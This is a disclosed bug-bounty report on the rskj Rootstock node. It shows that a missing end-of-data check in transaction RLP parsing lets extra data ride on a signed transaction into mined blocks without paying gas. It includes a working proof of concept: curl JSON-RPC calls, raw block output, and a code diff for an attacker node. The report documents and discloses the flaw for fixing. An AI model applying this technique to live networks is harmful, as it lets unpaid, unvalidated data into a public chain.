# Attacker can add arbitrary data to the blockchain without paying gas

## Report Details
- **Report ID**: 396954
- **URL**: https://hackerone.com/reports/396954
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-08-19T06:05:36.037Z
- **Disclosed**: 2019-09-18T13:18:55.944Z

## Reporter
- **Username**: ahook
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rootstocklabs

## Vulnerability Information
**Summary:**
Due to a missing sanity check in Transaction::rlpParse, an attacker can append arbitrary RLP-encoded data to the end of an otherwise valid transaction, and that data will not only pass through validation, but also be propagated throug the network and mined into a block. Since the block parser uses the same code for decoding transactions (as it should), the block will also be conidered valid.

**Description:**
The issue stems from the Transaction::rlpParse function:
https://github.com/rsksmart/rskj/blob/master/rskj-core/src/main/java/org/ethereum/core/Transaction.java#L242

Once all the relevant data is pulled from the decoded RLP, there are no checks to ensure that we've reached the end of the data.

Since the transaction is constructed using the raw encoded bytes, any future calls to getEncoded() will return the entire byte array, including the bad data at the end. Signature verification of the valid transaction will still pass because it uses getRawEncoded() to compute the signature, which ignores the extra data.

## Steps To Reproduce:
On a remote server I start up a regtest node from a clean codebase. This will begin mining as a single-node network:
```
remote:~/rskj$ java -Dblockchain.config.name=regtest -cp rskj-core/build/libs/rskj-core-0.5.0-SNAPSHOT-all.jar co.rsk.Start
```

On my local machine, I start another regtest node but I modify the config to a) talk to my remote node, and b) not mine. I don't mine on this node because I will be using it to manufacture beefy transactions and I want to make sure that other, clean nodes will accept/mine these transactions.

In addition to the config changes, I have also modified the eth_sendTransaction code to add extra rlp-encoded bytes to the end of the transaction. In order to easily see the data in a hex blob, I'm just setting it to a repeated 0xbeef string. I've also hacked the getBlockByHash function to return the full encoded hex block in the extraData field, as a quick way to query and see the raw block data.

```
local:~/rskj$ # Start the attacker's node:
local:~/rskj$ java -Dblockchain.config.name=regtest -cp rskj-core/build/libs/rskj-core-0.5.0-SNAPSHOT-all.jar co.rsk.Start
local:~/rskj$
local:~/rskj$ # Create a new account:
local:~/rskj$ curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"personal_newAccount", "params": ["beef"], "id":666}' http://127.0.0.1:4444/
{"jsonrpc":"2.0","id":666,"result":"0x0e016bdab929a365c7419ba51d0902cbde6035c2"}
local:~/rskj$
local:~/rskj$ # Send a transaction:
local:~/rskj$ curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"eth_sendTransaction", "params": [{"from": "0xCd2a3d9f938e13Cd947eC05ABC7fe734df8DD826", "to":"0x0e016bdab929a365c7419ba51d0902cbde6035c2", "gas":"0x76c0", "gasPrice": "0x9184e72a000", "value":"0x9184e72a"}], "id":666}' http://127.0.0.1:4444/
{"jsonrpc":"2.0","id":666,"result":"0x26ef60114e110258b1f6427042345c401068c9c666e0782f3d597c73ef1eb301"}
local:~/rskj$
local:~/rskj$ # Wait for the transaction to propagate to the remote server and be mined
local:~/rskj$ # Then check the receipt to see that it made it into the block:
local:~/rskj$ $ curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"eth_getTransactionReceipt", "params": ["0x26ef60114e110258b1f6427042345c401068c9c666e0782f3d597c73ef1eb301"], "id":666}' http://127.0.0.1:4444/
{"jsonrpc":"2.0","id":666,"result":{"transactionHash":"0x26ef60114e110258b1f6427042345c401068c9c666e0782f3d597c73ef1eb301","transactionIndex":"0x0","blockHash":"0x2d1333a31807d2ce3f058bf8ffe10a343b6d8fc59b7a918c3004fd1e46880747","blockNumber":"0x681","cumulativeGasUsed":"0x5208","gasUsed":"0x5208","contractAddress":null,"logs":[],"from":"0xcd2a3d9f938e13cd947ec05abc7fe734df8dd826","to":"0x0e016bdab929a365c7419ba51d0902cbde6035c2","root":"0x01","status":"0x01"}}
local:~/rskj$
local:~/rskj$ # Now that we see our beefy transaction in the block, look up the raw block
local:~/rskj$ curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"eth_getBlockByHash", "params": ["0x2d1333a31807d2ce3f058bf8ffe10a343b6d8fc59b7a918c3004fd1e46880747", true], "id":666}' http://127.0.0.1:4444/
{"jsonrpc":"2.0","id":666,"result":{"number":"0x681","hash":"0x2d1333a31807d2ce3f058bf8ffe10a343b6d8fc59b7a918c3004fd1e46880747","parentHash":"0x6101456ae392aeb4dfca1377cca9b407237eab308f079fe0e40d4f8533e5cf4b","sha3Uncles":"0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347","logsBloom":"0x00000000000000000000000000000000000000002000000000200000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000100000080000000000000000000000000000080000000000000000000000000000000000000008000000000000000000000000000000000010000000000000000000000080000000100000020000000000000000000000000000001000000000020000000001000000000000018000000000000020000000000000200040100000000000000000000000000000000000000000000000000000000000000000000000","transactionsRoot":"0x5e5bb633946b0b6a4c7e3128c6b12d6fdefc66b0dc925cea6d090c6dbdbb61e4","stateRoot":"0xcacaa63cbd707618051669ea88c76aeeb82105f8adad76c7682f8a039b4e07d2","receiptsRoot":"0x3f0773010b81c896ca4c9cccf6e69e0f3f32d62b82c23a957996d60c4104fabb","miner":"0xec4ddeb4380ad69b3e509baad9f158cdf4e4681d","difficulty":"0x01","totalDifficulty":"0x682","extraData":"0xf90383f902dba06101456ae392aeb4dfca1377cca9b407237eab308f079fe0e40d4f8533e5cf4ba01dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d4934794ec4ddeb4380ad69b3e509baad9f158cdf4e4681da0cacaa63cbd707618051669ea88c76aeeb82105f8adad76c7682f8a039b4e07d2a05e5bb633946b0b6a4c7e3128c6b12d6fdefc66b0dc925cea6d090c6dbdbb61e4a03f0773010b81c896ca4c9cccf6e69e0f3f32d62b82c23a957996d60c4104fabbb9010000000000000000000000000000000000000000002000000000200000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000100000080000000000000000000000000000080000000000000000000000000000000000000008000000000000000000000000000000000010000000000000000000000080000000100000020000000000000000000000000000001000000000020000000001000000000000018000000000000020000000000000200040100000000000000000000000000000000000000000000000000000000000000000000000018206818367c280825208845b78fd12808802ea11e32ad500000080b8507111010000000000000000000000000000000000000000000000000000000000000000009b6a3f2b95038fc2feba8c3641be2bfcc67ea6ea48519697a9ea0c1ab9ccbfbe12fd785bffff7f21670b0000a701000000019b6a3f2b95038fc2feba8c3641be2bfcc67ea6ea48519697a9ea0c1ab9ccbfbe0101b886000000000000040048d9465430728a2ba7f23b2792c24eaf61e134c8dafa6ec0fce944569ae2f7b752534b424c4f434b3aa74eb3b1efd29c88b6b250faa51e599dcf38b6bcf9080e0252cbf7574a29b54fffffffff0100f2052a01000000232103d3b2d67927fcbe6ea4f629d14f5938f6209186036e45833c3d51b3df80aab53aac00000000f8a2f880018609184e72a0008276c0940e016bdab929a365c7419ba51d0902cbde6035c2849184e72a8066a016e1fffd39de05273881dd8e2720664898bf28b34b57c568689eb3b969381d5aa05f157a0d01506a05685a2b9d4d74eb01b27486b00f6c3ac9823f1f6e12c732aa96beefbeefbeefbeefbeefbeefbeefbeefbeefbeefbeefdf82068000009400000000000000000000000000000000010000088080808080c0","size":"0x386","gasLimit":"0x67c280","gasUsed":"0x5208","timestamp":"0x5b78fd12","transactions":[{"hash":"0x26ef60114e110258b1f6427042345c401068c9c666e0782f3d597c73ef1eb301","nonce":"0x01","blockHash":"0x2d1333a31807d2ce3f058bf8ffe10a343b6d8fc59b7a918c3004fd1e46880747","blockNumber":"0x681","transactionIndex":"0x0","from":"0xcd2a3d9f938e13cd947ec05abc7fe734df8dd826","to":"0x0e016bdab929a365c7419ba51d0902cbde6035c2","gas":"0x76c0","gasPrice":"0x09184e72a000","value":"0x009184e72a","input":"0x00"},{"hash":"0xa703402c0c77c41597a09088c0ef3c61bb608da4683f4de8b1a3569297a61b25","nonce":"0x0680","blockHash":"0x2d1333a31807d2ce3f058bf8ffe10a343b6d8fc59b7a918c3004fd1e46880747","blockNumber":"0x681","transactionIndex":"0x1","from":"0x0000000000000000000000000000000000000000","to":"0x0000000000000000000000000000000001000008","gas":"0x00","gasPrice":"0x00","value":"0","input":"0x00"}],"uncles":[],"minimumGasPrice":"0"}}
```

Sorry for the giant data dump there, but if you take a look at the extraData in the returned block (which is actually the full block hex because of the hacked code), you can see that the "beefbeefbeefbeef" data made it in.

This is a proof that a malicious node (my local node) can craft a transaction with extra data appended, share that transaction with the network via the normal p2p process, and have the extra data mined into a block.

Here's the full diff for the attacker/local node. Sorry again, it's a little hacky. I could have used the eth_sendRawTransaction endpoint, but I didn't want to go through the process of hand-constructing the rlp-encoded data:
```
diff --git a/rskj-core/src/main/java/org/ethereum/core/Transaction.java b/rskj-core/src/main/java/org/ethereum/core/Transaction.java
index bbd21ee..801e18d 100644
--- a/rskj-core/src/main/java/org/ethereum/core/Transaction.java
+++ b/rskj-core/src/main/java/org/ethereum/core/Transaction.java
@@ -164,7 +164,7 @@ public class Transaction {
     }
 
     public Transaction toImmutableTransaction() {
-        return new ImmutableTransaction(this.getEncoded());
+        return new ImmutableTransaction(this.getBeefyEncoded());
     }
 
     private byte extractChainIdFromV(byte v) {
@@ -516,7 +516,17 @@ public class Transaction {
         return rlpRaw;
     }
 
+    // Clear the rlpEncoded if present, and re-encode with extra 0xbeef data
+    public byte[] getBeefyEncoded() {
+        rlpEncoded = null;
+        return getEncodedInternal("beefbeefbeefbeefbeefbeefbeefbeefbeefbeefbeef");
+    }
+
     public byte[] getEncoded() {
+        return getEncodedInternal(null);
+    }
+    private byte[] getEncodedInternal(String beef) {
         if (rlpEncoded != null) {
             return rlpEncoded;
         }
@@ -556,8 +566,15 @@ public class Transaction {
             s = RLP.encodeElement(EMPTY_BYTE_ARRAY);
         }
 
-        this.rlpEncoded = RLP.encodeList(toEncodeNonce, toEncodeGasPrice, toEncodeGasLimit,
-                toEncodeReceiveAddress, toEncodeValue, toEncodeData, v, r, s);
+        // if 0xbeef bytes are present, tack them on at the end of the tx
+        if (beef != null) {
+            this.rlpEncoded = RLP.encodeList(toEncodeNonce, toEncodeGasPrice, toEncodeGasLimit,
+                    toEncodeReceiveAddress, toEncodeValue, toEncodeData, v, r, s,
+                    RLP.encodeElement(Hex.decode(beef)));
+        } else {
+            this.rlpEncoded = RLP.encodeList(toEncodeNonce, toEncodeGasPrice, toEncodeGasLimit,
+                    toEncodeReceiveAddress, toEncodeValue, toEncodeData, v, r, s);
+        }
 
         Keccak256 hash = this.getHash();
         this.hash = hash == null ? null : hash.getBytes();
diff --git a/rskj-core/src/main/java/org/ethereum/rpc/Web3Impl.java b/rskj-core/src/main/java/org/ethereum/rpc/Web3Impl.java
index 04d0ddb..ad0f3c1 100644
--- a/rskj-core/src/main/java/org/ethereum/rpc/Web3Impl.java
+++ b/rskj-core/src/main/java/org/ethereum/rpc/Web3Impl.java
@@ -599,7 +599,8 @@ public class Web3Impl implements Web3 {
         br.miner = isPending ? null : TypeConverter.toJsonHex(b.getCoinbase().getBytes());
         br.difficulty = TypeConverter.toJsonHex(b.getDifficulty().getBytes());
         br.totalDifficulty = TypeConverter.toJsonHex(this.blockchain.getBlockStore().getTotalDifficultyForHash(b.getHash().getBytes()).asBigInteger());
-        br.extraData = TypeConverter.toJsonHex(b.getExtraData());
+        // hacky, for testing, return the full encoded block instead of extraData
+        br.extraData = TypeConverter.toJsonHex(b.getEncoded());
         br.size = TypeConverter.toJsonHex(b.getEncoded().length);
         br.gasLimit = TypeConverter.toJsonHex(b.getGasLimit());
         Coin mgp = b.getMinimumGasPrice();
diff --git a/rskj-core/src/main/resources/config/regtest.conf b/rskj-core/src/main/resources/config/regtest.conf
index df111fa..1e81a7c 100644
--- a/rskj-core/src/main/resources/config/regtest.conf
+++ b/rskj-core/src/main/resources/config/regtest.conf
@@ -8,12 +8,13 @@ peer {
         # the peer window will show
         # only what retrieved by active
         # peer [true/false]
-        enabled = false
+        enabled = true
 
         # List of the peers to start
         # the search of the online peers
         # values: [ip:port]
-        ip.list = [ ]
+        # replace <target_ip> with the "real" network node that will be mining
+        ip.list = ["<target_ip>:50501"]
     }
 
     # Port for server to listen for incoming connections
@@ -24,7 +25,8 @@ peer {
 }
 
 miner {
-    server.enabled = true
+    # Attacker node won't mine, so we know the tx propagated through the network
+    server.enabled = false
     client.enabled = true
     minGasPrice = 0
```

## Impact

The attacker can add arbitrary data into the blockchain without paying the requisite gas or undergoing any validation of the extra data.

I can think of three ways to get this data into the system: 1) the method I detailed in the above PoC, in which the attacker creates a valid transaction and adds the data, 2) a malicious miner could just add the data to any valid transaction it has in its pool; 3) an attacker could wait for new pending transactions to appear, then add their data and send the tx back to the network. If the attacker's version of the tx makes it to the miner that produces the next block, the data will make it to the chain without the attacker even needing to create their own valid tx.

I have not checked to see how much data can be appended, but I assume its limited only by whatever overall block/transaction/message size constraints exist.

## Attachments
No attachments
